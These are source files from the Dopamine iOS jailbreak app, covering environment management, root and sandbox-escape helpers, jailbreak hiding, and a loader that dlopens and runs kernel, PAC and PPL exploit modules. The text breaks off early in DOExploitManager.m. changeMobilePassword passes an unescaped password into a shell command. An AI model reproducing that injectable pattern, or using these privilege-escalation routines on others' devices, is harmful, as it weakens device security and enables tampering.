`Application/Dopamine/Jailbreak/DOEnvironmentManager.m`:

```m
//
//  EnvironmentManager.m
//  Dopamine
//
//  Created by Lars Fröder on 10.01.24.
//

#import "DOEnvironmentManager.h"
#import "UIImage+JPEG2000.h"

#import <sys/sysctl.h>
#import <sys/mount.h>
#import <sys/utsname.h>
#import <sys/stat.h>
#import <unistd.h>
#import <mach-o/dyld.h>
#import <libgrabkernel2/libgrabkernel2.h>
#import <libjailbreak/info.h>
#import <libjailbreak/codesign.h>
#import <libjailbreak/util.h>
#import <libjailbreak/display.h>
#import <libjailbreak/machine_info.h>
#import <libjailbreak/carboncopy.h>

#import <IOKit/IOKitLib.h>
#import "DOUIManager.h"
#import "DOExploitManager.h"
#import "DOPreferenceManager.h"
#import "NSData+Hex.h"
#import <LocalAuthentication/LocalAuthentication.h>

int reboot3(uint64_t flags, ...);

@implementation DOEnvironmentManager

@synthesize bootManifestHash = _bootManifestHash;

+ (instancetype)sharedManager
{
    static DOEnvironmentManager *shared;
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{
        shared = [[DOEnvironmentManager alloc] init];
    });
    return shared;
}

- (instancetype)init
{
    self = [super init];
    if (self) {
        _bootstrapNeedsMigration = NO;
        _bootstrapper = [[DOBootstrapper alloc] init];
        if ([self isJailbroken]) {
            gSystemInfo.jailbreakInfo.rootPath = strdup(jbclient_get_jbroot() ?: "");
        }
        else if ([self isInstalledThroughTrollStore]) {
            [self locateJailbreakRoot];
        }
    }
    return self;
}

- (NSString *)nightlyHash
{
#ifdef NIGHTLY
    return [NSString stringWithUTF8String:COMMIT_HASH];
#else
    return nil;
#endif
}

- (NSString *)appVersion
{
    return [[NSBundle mainBundle] objectForInfoDictionaryKey:@"CFBundleShortVersionString"];
}

- (NSString *)appVersionDisplayString
{
    NSString *nightlyHash = [self nightlyHash];
    if (nightlyHash) {
        return [NSString stringWithFormat:@"%@~%@", self.appVersion, [nightlyHash substringToIndex:6]];
    }
    else {
        return [self appVersion];
    }
}

- (NSData *)bootManifestHash
{
    if (!_bootManifestHash) {
        io_registry_entry_t registryEntry = IORegistryEntryFromPath(kIOMainPortDefault, "IODeviceTree:/chosen");
        if (registryEntry) {
            _bootManifestHash = (__bridge NSData *)IORegistryEntryCreateCFProperty(registryEntry, CFSTR("boot-manifest-hash"), NULL, 0);
        }
    }
    return _bootManifestHash;
}

- (NSString *)activePrebootPath
{
    return [@"/private/preboot" stringByAppendingPathComponent:[self bootManifestHash].hexString];
}

- (void)locateJailbreakRoot
{
    if (!gSystemInfo.jailbreakInfo.rootPath) {
        NSString *activePrebootPath = [self activePrebootPath];
        
        NSString *randomizedJailbreakPath;
        
        // First attempt at finding jailbreak root, look for Dopamine 2.x path
        for (NSString *subItem in [[NSFileManager defaultManager] contentsOfDirectoryAtPath:activePrebootPath error:nil]) {
            if (subItem.length == 15 && [subItem hasPrefix:@"dopamine-"]) {
                randomizedJailbreakPath = [activePrebootPath stringByAppendingPathComponent:subItem];
                break;
            }
        }
        
        if (!randomizedJailbreakPath) {
            // Second attempt at finding jailbreak root, look for Dopamine 1.x path, but as other jailbreaks use it too, make sure it is Dopamine
            // Some other jailbreaks also commit the sin of creating .installed_dopamine, for these we try to filter them out by checking for their installed_ file
            // If we find this and are sure it's from Dopamine 1.x, rename it so all Dopamine 2.x users will have the same path
            for (NSString *subItem in [[NSFileManager defaultManager] contentsOfDirectoryAtPath:activePrebootPath error:nil]) {
                if (subItem.length == 9 && [subItem hasPrefix:@"jb-"]) {
                    NSString *candidateLegacyPath = [activePrebootPath stringByAppendingPathComponent:subItem];
                    
                    BOOL installedDopamine = [[NSFileManager defaultManager] fileExistsAtPath:[candidateLegacyPath stringByAppendingPathComponent:@"procursus/.installed_dopamine"]];
                    
                    if (installedDopamine) {
                        // Hopefully all other jailbreaks that use jb-<UUID>?
                        // These checks exist because of dumb users (and jailbreak developers) creating .installed_dopamine on jailbreaks that are NOT dopamine...
                        BOOL installedNekoJB = [[NSFileManager defaultManager] fileExistsAtPath:[candidateLegacyPath stringByAppendingPathComponent:@"procursus/.installed_nekojb"]];
                        BOOL installedDefinitelyNotAGoodName = [[NSFileManager defaultManager] fileExistsAtPath:[candidateLegacyPath stringByAppendingPathComponent:@"procursus/.xia0o0o0o_jb_installed"]];
                        BOOL installedPalera1n = [[NSFileManager defaultManager] fileExistsAtPath:[candidateLegacyPath stringByAppendingPathComponent:@"procursus/.palecursus_strapped"]];
                        if (installedNekoJB || installedPalera1n || installedDefinitelyNotAGoodName) {
                            continue;
                        }
                        
                        randomizedJailbreakPath = candidateLegacyPath;
                        _bootstrapNeedsMigration = YES;
                        break;
                    }
                }
            }
        }
        
        if (randomizedJailbreakPath) {
            NSString *jailbreakRootPath = [randomizedJailbreakPath stringByAppendingPathComponent:@"procursus"];
            if ([[NSFileManager defaultManager] fileExistsAtPath:jailbreakRootPath]) {
                // This attribute serves as the primary source of what the root path is
                // Anything else in the jailbreak will get it from here
                gSystemInfo.jailbreakInfo.rootPath = strdup(jailbreakRootPath.fileSystemRepresentation);
            }
        }
    }
}

- (NSError *)ensureJailbreakRootExists
{
    NSError *error = nil;

    [self locateJailbreakRoot];
    
    if (!gSystemInfo.jailbreakInfo.rootPath || _bootstrapNeedsMigration) {
        [_bootstrapper ensurePrivatePrebootIsWritable];

        NSString *activePrebootPath = [self activePrebootPath];

        NSString *characterSet = @"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
        NSUInteger stringLen = 6;
        NSMutableString *randomString = [NSMutableString stringWithCapacity:stringLen];
        for (NSUInteger i = 0; i < stringLen; i++) {
            NSUInteger randomIndex = arc4random_uniform((uint32_t)[characterSet length]);
            unichar randomCharacter = [characterSet characterAtIndex:randomIndex];
            [randomString appendFormat:@"%C", randomCharacter];
        }
        
        NSString *randomJailbreakFolderName = [NSString stringWithFormat:@"dopamine-%@", randomString];
        NSString *randomizedJailbreakPath = [activePrebootPath stringByAppendingPathComponent:randomJailbreakFolderName];
        NSString *jailbreakRootPath = [randomizedJailbreakPath stringByAppendingPathComponent:@"procursus"];
        
        if (_bootstrapNeedsMigration) {
            NSString *oldRandomizedJailbreakPath = [[NSString stringWithUTF8String:gSystemInfo.jailbreakInfo.rootPath] stringByDeletingLastPathComponent];
            [[NSFileManager defaultManager] moveItemAtPath:oldRandomizedJailbreakPath toPath:randomizedJailbreakPath error:&error];
        }
        else {
            if (![[NSFileManager defaultManager] fileExistsAtPath:jailbreakRootPath]) {
                [[NSFileManager defaultManager] createDirectoryAtPath:jailbreakRootPath withIntermediateDirectories:YES attributes:nil error:&error];
            }
        }
        
        if (!error) {
            gSystemInfo.jailbreakInfo.rootPath = strdup(jailbreakRootPath.UTF8String);
        }
    }
    
    return error;
}

- (BOOL)isArm64e
{
    cpu_subtype_t cpusubtype = 0;
    size_t len = sizeof(cpusubtype);
    if (sysctlbyname("hw.cpusubtype", &cpusubtype, &len, NULL, 0) == -1) { return NO; }
    return (cpusubtype & ~CPU_SUBTYPE_MASK) == CPU_SUBTYPE_ARM64E;
}

- (NSString *)versionSupportString
{
    if ([self isArm64e]) {
        return @"iOS 15.0 - 16.5.1 (arm64e)";
    }
    else {
        return @"iOS 15.0 - 16.6.1 (arm64)";
    }
}

- (BOOL)isInstalledThroughTrollStore
{
    static BOOL trollstoreInstallation = NO;
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{
        NSString* trollStoreMarkerPath = [[[NSBundle mainBundle].bundlePath stringByDeletingLastPathComponent] stringByAppendingPathComponent:@"_TrollStore"];
        trollstoreInstallation = [[NSFileManager defaultManager] fileExistsAtPath:trollStoreMarkerPath];
    });
    return trollstoreInstallation;
}

- (BOOL)isJailbroken
{
    static BOOL jailbroken = NO;
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{
        uint32_t csFlags = 0;
        csops(getpid(), CS_OPS_STATUS, &csFlags, sizeof(csFlags));
        jailbroken = csFlags & CS_PLATFORM_BINARY;
    });
    return jailbroken;
}

- (NSString *)jailbrokenVersion
{
    if (!self.isJailbroken) return nil;

    __block NSString *version;
    [self runAsRoot:^{
        [self runUnsandboxed:^{
            version = [NSString stringWithContentsOfFile:JBROOT_PATH(@"/basebin/.version") encoding:NSUTF8StringEncoding error:nil];
        }];
    }];
    return version;
}

- (BOOL)isBootstrapped
{
    return (BOOL)jbinfo(rootPath);
}

- (void)runUnsandboxed:(void (^)(void))unsandboxBlock
{
    if ([self isInstalledThroughTrollStore]) {
        unsandboxBlock();
    }
    else if([self isJailbroken]) {
        uint64_t labelBackup = 0;
        jbclient_root_set_mac_label(1, -1, &labelBackup);
        unsandboxBlock();
        jbclient_root_set_mac_label(1, labelBackup, NULL);
    }
    else {
        // Hope that we are already unsandboxed
        unsandboxBlock();
    }
}

- (void)runAsRoot:(void (^)(void))rootBlock
{
    uint32_t orgUser = getuid();
    uint32_t orgGroup = getgid();
    if (geteuid() == 0 && orgGroup == 0) {
        rootBlock();
        return;
    }

    int ur = 0, gr = 0;
    if (orgUser != 0) ur = setuid(0);
    if (orgGroup != 0) gr = setgid(0);
    if (ur == 0 && gr == 0) {
        rootBlock();
    }
    
    if (gr == 0 && orgGroup != 0) setgid(orgGroup);
    if (ur == 0 && orgUser != 0) seteuid(orgUser);
}

- (int)runTrollStoreAction:(NSString *)action
{
    if (![self isInstalledThroughTrollStore]) return -1;
    
    uint32_t selfPathSize = PATH_MAX;
    char selfPath[selfPathSize];
    _NSGetExecutablePath(selfPath, &selfPathSize);
    return exec_cmd_root(selfPath, "trollstore", action.UTF8String, NULL);
}

- (void)respring
{
    [self runAsRoot:^{
        __block int pid = 0;
        __block int r = 0;
        [self runUnsandboxed:^{
            r = exec_cmd_suspended(&pid, JBROOT_PATH("/usr/bin/sbreload"), NULL);
            if (r == 0) {
                kill(pid, SIGCONT);
            }
        }];
        if (r == 0) {
            if (cmd_wait_for_exit(pid) != 0) {
                // Fallback
                [self runUnsandboxed:^{
                    killall("/usr/libexec/backboardd", SIGTERM);
                }];
            }
        }
    }];
}

- (void)rebootUserspace
{
    [self runAsRoot:^{
        __block int pid = 0;
        __block int r = 0;
        [self runUnsandboxed:^{
            r = exec_cmd_suspended(&pid, JBROOT_PATH("/basebin/jbctl"), "reboot_userspace", NULL);
            if (r == 0) {
                // the original plan was to have the process continue outside of this block
                // unfortunately sandbox blocks kill aswell, so it's a bit racy but works

                // we assume we leave this unsandbox block before the userspace reboot starts
                // to avoid leaking the label, this seems to work in practice
                // and even if it doesn't work, leaking the label is no big deal
                kill(pid, SIGCONT);
            }
        }];
        if (r == 0) {
            cmd_wait_for_exit(pid);
        }
    }];
}

- (void)refreshJailbreakApps
{
    [self runAsRoot:^{
        [self runUnsandboxed:^{
            exec_cmd(JBROOT_PATH("/usr/bin/uicache"), "-a", NULL);
        }];
    }];
}

- (void)unregisterJailbreakApps
{
    [self runAsRoot:^{
        [self runUnsandboxed:^{
            NSArray *jailbreakApps = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:JBROOT_PATH(@"/Applications") error:nil];
            if (jailbreakApps.count) {
                for (NSString *jailbreakApp in jailbreakApps) {
                    NSString *jailbreakAppPath = [JBROOT_PATH(@"/Applications") stringByAppendingPathComponent:jailbreakApp];
                    exec_cmd(JBROOT_PATH("/usr/bin/uicache"), "-u", jailbreakAppPath.fileSystemRepresentation, NULL);
                }
            }
        }];
    }];
}

- (void)reboot
{
    [self runAsRoot:^{
        [self runUnsandboxed:^{
            reboot3(0x8000000000000000, 0);
        }];
    }];
}


- (void)changeMobilePassword:(NSString *)newPassword
{
    [self runAsRoot:^{
        [self runUnsandboxed:^{
            NSString *dashCommand = [NSString stringWithFormat:@"printf \"%%s\\n\" \"%@\" | %@ usermod 501 -h 0", newPassword, JBROOT_PATH(@"/usr/sbin/pw")];
            exec_cmd(JBROOT_PATH("/usr/bin/dash"), "-c", dashCommand.UTF8String, NULL);
        }];
    }];
}

- (NSError*)updateEnvironment
{
    NSString *newBasebinTarPath = [[NSBundle mainBundle].bundlePath stringByAppendingPathComponent:@"basebin.tar"];
    int result = jbclient_platform_stage_jailbreak_update(newBasebinTarPath.fileSystemRepresentation);
    if (result == 0) {
        [self rebootUserspace];
        return nil;
    }
    return [NSError errorWithDomain:@"Dopamine" code:result userInfo:nil];
}

- (void)updateJailbreakFromTIPA:(NSString *)tipaPath
{
    [self runAsRoot:^{
        [self runUnsandboxed:^{
            pid_t pid = 0;
            if (exec_cmd_suspended(&pid, JBROOT_PATH("/basebin/jbctl"), "update", "tipa", tipaPath.fileSystemRepresentation, NULL) == 0) {
                kill(pid, SIGCONT);
            }
        }];
    }];
}

- (BOOL)isTweakInjectionEnabled
{
    return ![[NSFileManager defaultManager] fileExistsAtPath:JBROOT_PATH(@"/basebin/.safe_mode")];
}

- (void)setTweakInjectionEnabled:(BOOL)enabled
{
    NSString *safeModePath = JBROOT_PATH(@"/basebin/.safe_mode");
    if ([self isJailbroken]) {
        [self runAsRoot:^{
            [self runUnsandboxed:^{
                if (enabled) {
                    [[NSFileManager defaultManager] removeItemAtPath:safeModePath error:nil];
                }
                else {
                    [[NSData data] writeToFile:safeModePath atomically:YES];
                }
            }];
        }];
    }
}

- (BOOL)isIDownloadEnabled
{
    __block BOOL isEnabled = NO;
    [self runAsRoot:^{
        [self runUnsandboxed:^{
            NSDictionary *disabledDict = [NSDictionary dictionaryWithContentsOfFile:@"/var/db/com.apple.xpc.launchd/disabled.plist"];
            NSNumber *idownloaddDisabledNum = disabledDict[@"com.opa334.Dopamine.idownloadd"];
            if (idownloaddDisabledNum) {
                isEnabled = ![idownloaddDisabledNum boolValue];
            }
            else {
                isEnabled = NO;
            }
        }];
    }];
    return isEnabled;
}

- (void)setIDownloadEnabled:(BOOL)enabled needsUnsandbox:(BOOL)needsUnsandbox
{
    void (^updateBlock)(void) = ^{
        if (enabled) {
            exec_cmd_trusted(JBROOT_PATH("/usr/bin/launchctl"), "enable", "system/com.opa334.Dopamine.idownloadd", NULL);
        }
        else {
            exec_cmd_trusted(JBROOT_PATH("/usr/bin/launchctl"), "disable", "system/com.opa334.Dopamine.idownloadd", NULL);
        }
    };

    if (needsUnsandbox) {
        [self runAsRoot:^{
            [self runUnsandboxed:updateBlock];
        }];
    }
    else {
        updateBlock();
    }
}

- (void)setIDownloadLoaded:(BOOL)loaded needsUnsandbox:(BOOL)needsUnsandbox
{
    if (loaded) {
        [self setIDownloadEnabled:loaded needsUnsandbox:needsUnsandbox];
    }
    
    void (^updateBlock)(void) = ^{
        if (loaded) {
            exec_cmd(JBROOT_PATH("/usr/bin/launchctl"), "load", JBROOT_PATH("/basebin/LaunchDaemons/com.opa334.Dopamine.idownloadd.plist"), NULL);
        }
        else {
            exec_cmd(JBROOT_PATH("/usr/bin/launchctl"), "unload", JBROOT_PATH("/basebin/LaunchDaemons/com.opa334.Dopamine.idownloadd.plist"), NULL);
        }
    };
    
    if (needsUnsandbox) {
        [self runAsRoot:^{
            [self runUnsandboxed:updateBlock];
        }];
    }
    else {
        updateBlock();
    }
    
    if (!loaded) {
        [self setIDownloadEnabled:loaded needsUnsandbox:needsUnsandbox];
    }
}

- (BOOL)isFakelibMounted
{
    struct statfs fsb;
    if (statfs("/usr/lib", &fsb) != 0) return NO;
    return strcmp(fsb.f_mntonname, "/usr/lib") == 0;
}

- (int)setFakelibMounted:(BOOL)mounted
{
    int r = 0;
    if (mounted != [self isFakelibMounted]) {
        const char *arg = mounted ? "mount" : "unmount";
        r = exec_cmd(JBROOT_PATH("/basebin/jbctl"), "internal", "fakelib", arg, NULL);
    }
    return r;
}

- (int)setPrivatePrebootProtected:(BOOL)protected
{
    const char *arg = protected ? "activate" : "deactivate";
    return exec_cmd(JBROOT_PATH("/basebin/jbctl"), "internal", "protection", arg, NULL);
}

- (BOOL)isJailbreakHidden
{
    return ![[NSFileManager defaultManager] fileExistsAtPath:@"/var/jb"];
}

- (void)setJailbreakHidden:(BOOL)hidden
{
    if (hidden && ![self isJailbroken] && geteuid() != 0) {
        [self runTrollStoreAction:@"hide-jailbreak"];
        return;
    }
    
    void (^actionBlock)(void) = ^{
        BOOL alreadyHidden = [self isJailbreakHidden];
        if (hidden != alreadyHidden) {
            if (hidden) {
                if ([self isJailbroken]) {
                    [self unregisterJailbreakApps];
                    [self setPrivatePrebootProtected:NO];
                    [self setFakelibMounted:NO];
                    jbclient_platform_set_systemwide_domain_enabled(false);
                }
                [[NSFileManager defaultManager] removeItemAtPath:@"/var/jb" error:nil];
            }
            else {
                [[NSFileManager defaultManager] createSymbolicLinkAtPath:@"/var/jb" withDestinationPath:JBROOT_PATH(@"/") error:nil];
                if ([self isJailbroken]) {
                    jbclient_platform_set_systemwide_domain_enabled(true);
                    [self setFakelibMounted:YES];
                    [self setPrivatePrebootProtected:YES];
                    [self refreshJailbreakApps];
                }
            }
        }
    };
    
    if ([self isJailbroken]) {
        [self runAsRoot:^{
            [self runUnsandboxed:actionBlock];
        }];
    }
    else {
        actionBlock();
    }
}

- (NSString *)accessibleKernelPath
{
    if ([self isInstalledThroughTrollStore]) {
        NSString *kernelcachePath = [[self activePrebootPath] stringByAppendingPathComponent:@"System/Library/Caches/com.apple.kernelcaches/kernelcache"];
        if ([[NSFileManager defaultManager] fileExistsAtPath:kernelcachePath]) {
            return kernelcachePath;
        }
        return @"/System/Library/Caches/com.apple.kernelcaches/kernelcache";
    }
    else {
        NSString *kernelInApp = [NSBundle.mainBundle.bundlePath stringByAppendingPathComponent:@"kernelcache"];
        if ([[NSFileManager defaultManager] fileExistsAtPath:kernelInApp]) {
            return kernelInApp;
        }
        
        [[DOUIManager sharedInstance] sendLog:@"Downloading Kernel" debug:NO];
        NSString *kernelcachePath = [NSHomeDirectory() stringByAppendingPathComponent:@"Documents/kernelcache"];
        if (![[NSFileManager defaultManager] fileExistsAtPath:kernelcachePath]) {
            if (grab_kernelcache(kernelcachePath) == false) return nil;
        }
        return kernelcachePath;
    }
}

- (BOOL)isPACBypassRequired
{
    if (![self isArm64e]) return NO;
    
    if (@available(iOS 15.2, *)) {
        return NO;
    }
    return YES;
}

- (BOOL)isPPLBypassRequired
{
    return [self isArm64e];
}

- (BOOL)isSupported
{
    //cpu_subtype_t cpuFamily = 0;
    //size_t cpuFamilySize = sizeof(cpuFamily);
    //sysctlbyname("hw.cpufamily", &cpuFamily, &cpuFamilySize, NULL, 0);
    //if (cpuFamily == CPUFAMILY_ARM_TYPHOON) return false; // A8X is unsupported for now (due to 4k page size)
    
    DOExploitManager *exploitManager = [DOExploitManager sharedManager];
    if ([exploitManager availableExploitsForType:EXPLOIT_TYPE_KERNEL].count) {
        if (![self isPACBypassRequired] || [exploitManager availableExploitsForType:EXPLOIT_TYPE_PAC].count) {
            if (![self isPPLBypassRequired] || [exploitManager availableExploitsForType:EXPLOIT_TYPE_PPL].count) {
                return true;
            }
        }
    }
    
    return false;
}

- (BOOL)deviceSupportsFaceID
{
    if (![LAContext class]) return NO;

    LAContext *myContext = [[LAContext alloc] init];
    NSError *authError = nil;
    if (![myContext canEvaluatePolicy:LAPolicyDeviceOwnerAuthenticationWithBiometrics error:&authError]) {
        NSLog(@"%@", [authError localizedDescription]);
        return NO;
    }

    return myContext.biometryType == LABiometryTypeFaceID;
}

- (BOOL)deviceSupportsLandscapeBootLogo
{
    struct utsname u;
    uname(&u);
    const char *ipadString = "iPad";

    bool isPad = strncmp(u.machine, ipadString, strlen(ipadString)) == 0;
    return isPad && [self deviceSupportsFaceID];
}

- (NSError *)prepareBootstrap
{
    __block NSError *errOut;
    dispatch_semaphore_t sema = dispatch_semaphore_create(0);
    [_bootstrapper prepareBootstrapWithCompletion:^(NSError *error) {
        errOut = error;
        dispatch_semaphore_signal(sema);
    }];
    dispatch_semaphore_wait(sema, DISPATCH_TIME_FOREVER);
    return errOut;
}

- (NSError *)finalizeBootstrap
{
    return [_bootstrapper finalizeBootstrap];
}

- (NSError *)deleteBootstrap
{
    if (![self isJailbroken] && getuid() != 0) {
        int r = [self runTrollStoreAction:@"delete-bootstrap"];
        if (r != 0) {
            // TODO: maybe handle error
        }
        return nil;
    }
    else if ([self isJailbroken]) {
        __block NSError *error;
        [self runAsRoot:^{
            [self runUnsandboxed:^{
                error = [self->_bootstrapper deleteBootstrap];
            }];
        }];
        return error;
    }
    else {
        // Let's hope for the best
        return [_bootstrapper deleteBootstrap];
    }
}

- (NSError *)reinstallPackageManagers
{
    __block NSError *error;
    [self runAsRoot:^{
        [self runUnsandboxed:^{
            error = [self->_bootstrapper installPackageManagers];
        }];
    }];
    return error;
}

- (NSError *)updateBootLogo
{
    const char *bootLogoPath = JBROOT_PATH("/basebin/bootlogo.jp2");
    if ([[DOPreferenceManager sharedManager] boolPreferenceValueForKey:@"bootlogoEnabled" fallback:YES]) {
        UIImage *bootLogoImage;

        if ([[DOPreferenceManager sharedManager] boolPreferenceValueForKey:@"customBootlogoEnabled" fallback:NO]) {
            bootLogoImage = [UIImage imageWithContentsOfFile:[DOUIManager sharedInstance].bootlogoPath];
        }

        if (!bootLogoImage) {
            bootLogoImage = [[DOUIManager sharedInstance] renderBootLogo];
        }

        [self runAsRoot:^{
            [self runUnsandboxed:^{
                unlink(bootLogoPath);
                [[bootLogoImage jp2DataWithCompressionQuality:0.9] writeToFile:[NSString stringWithUTF8String:bootLogoPath] atomically:NO];
            }];
        }];

        return nil;
    }
    else {
        [self runAsRoot:^{
            [self runUnsandboxed:^{
                unlink(bootLogoPath);
            }];
        }];
        return nil;
    }
}

@end

```

`Application/Dopamine/Jailbreak/DOExploit.h`:

```h
//
//  Exploit.h
//  Dopamine
//
//  Created by Lars Fröder on 10.01.24.
//

#import <Foundation/Foundation.h>

NS_ASSUME_NONNULL_BEGIN

typedef enum {
    EXPLOIT_TYPE_KERNEL = 0,
    EXPLOIT_TYPE_PAC,
    EXPLOIT_TYPE_PPL,
    EXPLOIT_TYPE_COUNT,
} ExploitType;

@interface DOExploit : NSObject
{
    void *_handle;
    NSDictionary *_flavorInfo;
    BOOL _supportLoaded;
    BOOL _supported;
}

@property (nonatomic) NSString *name;
@property (nonatomic) NSString *identifier;
@property (nonatomic) NSString *flavorName;
@property (nonatomic) NSString *executablePath;
@property (nonatomic) uint64_t priority;
@property (nonatomic) ExploitType type;

@property (nonatomic, readonly) NSString *displayName;

- (instancetype)initWithPath:(NSString *)exploitPath info:(NSDictionary *)exploitInfo flavorName:(NSString *)flavorName flavorDictionary:(NSDictionary *)flavorInfo;

- (BOOL)isSupported;

- (int)load;
- (int)run;
- (int)cleanup;

@end

NS_ASSUME_NONNULL_END

```

`Application/Dopamine/Jailbreak/DOExploit.m`:

```m
//
//  Exploit.m
//  Dopamine
//
//  Created by Lars Fröder on 10.01.24.
//

#import "DOExploit.h"
#import <dlfcn.h>
#import <sys/utsname.h>
#import <sys/sysctl.h>
#import <UIKit/UIKit.h>
#import <libjailbreak/machine_info.h>

#import "DOExploitManager.h"
#import "DOEnvironmentManager.h"

@implementation DOExploit

- (instancetype)initWithPath:(NSString *)exploitPath info:(NSDictionary *)exploitInfo flavorName:(NSString *)flavorName flavorDictionary:(NSDictionary *)flavorInfo
{
    self = [super init];
    if (self) {
        _flavorInfo = flavorInfo;
        _flavorName = flavorName;
        _executablePath = [exploitPath stringByAppendingPathComponent:exploitInfo[@"CFBundleExecutable"]];
        
        NSString *typeString = exploitInfo[@"DPExploitType"];
        if ([typeString isEqualToString:@"Kernel"]) {
            _type = EXPLOIT_TYPE_KERNEL;
        }
        else if ([typeString isEqualToString:@"PAC"]) {
            _type = EXPLOIT_TYPE_PAC;
        }
        else if ([typeString isEqualToString:@"PPL"]) {
            _type = EXPLOIT_TYPE_PPL;
        }
        else {
            NSLog(@"Unknown Exploit Type: %@", typeString);
            return nil;
        }
        
        NSNumber *priorityNum = flavorInfo[@"DPFlavorPriority"];
        _priority = [priorityNum unsignedLongLongValue];
        
        _name = exploitInfo[@"CFBundleDisplayName"];
        _identifier = exploitInfo[@"CFBundleIdentifier"];
        if (![flavorName isEqualToString:@"default"]) {
            _name = [NSString stringWithFormat:@"%@, %@", _name, flavorName];
            _identifier = [NSString stringWithFormat:@"%@.%@", _identifier, flavorName];
        }
    }
    return self;
}

- (NSString *)displayName
{
    if (self.flavorName) {
        return [NSString stringWithFormat:@"%@ (%@)", self.name, self.flavorName];
    }
    else {
        return self.name;
    }
}

- (BOOL)isSupported
{
    if (!_supportLoaded) {
        struct utsname systemInfo;
        uname(&systemInfo);
        NSString *thisDevice = [NSString stringWithUTF8String:systemInfo.machine];
        
        cpu_subtype_t cpuFamily = 0;
        size_t cpuFamilySize = sizeof(cpuFamily);
        sysctlbyname("hw.cpufamily", &cpuFamily, &cpuFamilySize, NULL, 0);
        
        NSString *thisCPU;
        switch (cpuFamily) {
            case CPUFAMILY_ARM_TYPHOON:
                thisCPU = @"A8";
                break;
            case CPUFAMILY_ARM_TWISTER:
                thisCPU = @"A9";
                break;
            case CPUFAMILY_ARM_HURRICANE:
                thisCPU = @"A10";
                break;
            case CPUFAMILY_ARM_MONSOON_MISTRAL:
                thisCPU = @"A11";
                break;
            case CPUFAMILY_ARM_VORTEX_TEMPEST:
                thisCPU = @"A12";
                break;
            case CPUFAMILY_ARM_LIGHTNING_THUNDER:
                thisCPU = @"A13";
                break;
            case CPUFAMILY_ARM_FIRESTORM_ICESTORM:
                thisCPU = @"A14"; // Also M1
                break;
            case CPUFAMILY_ARM_BLIZZARD_AVALANCHE:
                thisCPU = @"A15"; // Also M2
                break;
            case CPUFAMILY_ARM_EVEREST_SAWTOOTH:
                thisCPU = @"A16";
                break;
            case CPUFAMILY_ARM_COLL:
                thisCPU = @"A17";
                break;
        }
        
        char OSVersionString[64];
        size_t OSVersionStringLen = sizeof(OSVersionString) - 1;
        sysctlbyname("kern.osversion", OSVersionString, &OSVersionStringLen, NULL, 0);
        NSString *thisIOSBuild = [NSString stringWithUTF8String:OSVersionString];
        
        NSString *thisIOSVersion = [[UIDevice currentDevice] systemVersion];
        BOOL isArm64e = [[DOEnvironmentManager sharedManager] isArm64e];
        
        NSArray *supportedRanges = _flavorInfo[@"DPSupportedRanges"];
        for (NSDictionary *supportedRange in supportedRanges) {
            NSString *rangeStart = supportedRange[@"Start"];
            NSString *rangeEnd = supportedRange[@"End"];
            
            NSComparisonResult startResult = [thisIOSVersion compare:rangeStart options:NSNumericSearch];
            NSComparisonResult endResult = [thisIOSVersion compare:rangeEnd options:NSNumericSearch];
            
            _supported = ((endResult == NSOrderedAscending || endResult == NSOrderedSame) && (startResult == NSOrderedDescending || startResult == NSOrderedSame));
            if (_supported) break;
        }
        
        NSArray *exclusionInclusionSets = _supported ? _flavorInfo[@"DPSupportExclude"] : _flavorInfo[@"DPSupportInclude"];
        if (exclusionInclusionSets) {
            for (NSDictionary *set in exclusionInclusionSets) {
                NSArray *devicesSet = set[@"Devices"];
                BOOL affectsThisDevice = NO;
                if (devicesSet) {
                    for (NSString *device in devicesSet) {
                        if (([device isEqualToString:@"arm64e"] && isArm64e) ||
                            ([device isEqualToString:@"arm64"] && !isArm64e) ||
                            [device isEqualToString:thisDevice] ||
                            [device isEqualToString:thisCPU]) {
                            affectsThisDevice = YES;
                            break;
                        }
                    }
                }
                else {
                    // No "Devices" means all
                    affectsThisDevice = YES;
                }
                if (!affectsThisDevice) continue;
                
                NSArray *builds = set[@"Builds"];
                if (builds) {
                    for (NSString *build in builds) {
                        if ([thisIOSBuild isEqualToString:build]) {
                            _supported = !_supported;
                            break;
                        }
                    }
                }
                else {
                    _supported = !_supported;
                }
                break;
            }
        }
        _supportLoaded = YES;
    }
    return _supported;
}

- (int)load
{
    if (!_handle) {
        _handle = dlopen(_executablePath.fileSystemRepresentation, RTLD_NOW);
    }
    if (_handle) return 0;
    return -1;
}

- (int)run
{
    if (!_handle) return -1;
    int (*exploit_init)(const char *flavor) = dlsym(_handle, "exploit_init");
    if (!exploit_init) return -1;
    int r = exploit_init(_flavorName.UTF8String);
    if (r == 0) [[DOExploitManager sharedManager].activeExploits addObject:self];
    return r;
}

- (int)cleanup
{
    if (!_handle) return -1;
    int (*exploit_deinit)(void) = dlsym(_handle, "exploit_deinit");
    if (!exploit_deinit) return -1;
    int r = exploit_deinit();
    if (r == 0) [[DOExploitManager sharedManager].activeExploits removeObject:self];
    return r;
}

- (NSString *)description
{
    return [NSString stringWithFormat:@"<Exploit: identifier = %@>", self.identifier];
}

@end

```

`Application/Dopamine/Jailbreak/DOExploitManager.h`:

```h
//
//  ExploitManager.h
//  Dopamine
//
//  Created by Lars Fröder on 09.01.24.
//

#import <Foundation/Foundation.h>
#import "DOExploit.h"

NS_ASSUME_NONNULL_BEGIN

@interface DOExploitManager : NSObject
{
    DOExploit *_preferredExploitForType[EXPLOIT_TYPE_COUNT];
}

@property (nonatomic) NSSet<DOExploit *> *allExploits;
@property (nonatomic) NSMutableArray<DOExploit *> *activeExploits;

@property (nonatomic, readonly) DOExploit *preferredKernelExploit;
@property (nonatomic, readonly) DOExploit *preferredPACBypass;
@property (nonatomic, readonly) DOExploit *preferredPPLBypass;

@property (nonatomic, readonly) DOExploit *selectedKernelExploit;
@property (nonatomic, readonly) DOExploit *selectedPACBypass;
@property (nonatomic, readonly) DOExploit *selectedPPLBypass;


+ (instancetype)sharedManager;

- (NSSet<DOExploit *> *)availableExploitsForType:(ExploitType)type;
- (int)cleanUpExploits;

@end

NS_ASSUME_NONNULL_END

```

`Application/Dopamine/Jailbreak/DOExploitManager.m`:

```m
//
//  ExploitManager.m
//  Dopamine
//
//  Created by Lars Fröder on 09.01.24.
//

#import "DOExploitManager.h"
#import "DOExploit.h"
#import "DOEnvironmentManager.h"
